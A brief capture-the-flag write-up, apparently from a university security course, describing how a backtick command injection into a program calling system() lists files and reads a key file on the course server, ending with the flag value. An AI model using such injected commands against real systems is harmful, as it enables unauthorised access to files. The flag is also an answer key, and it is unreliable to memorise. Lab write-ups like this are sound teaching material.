I connected using:

```
nc shell.hackintro25.di.uoa.gr 16139
```

This ran the `injection_1` program, and after looking at the source code, I spotted a **command injection vulnerability**. The program used `system()` to echo my input, but I could inject extra commands with backticks.

I first ran:

```
`ls`
```

This showed a file called `key`, so I then ran:

```
`cat key`
```

This gave me the flag:

`81207634a1e560c5697ddb8775f73880`
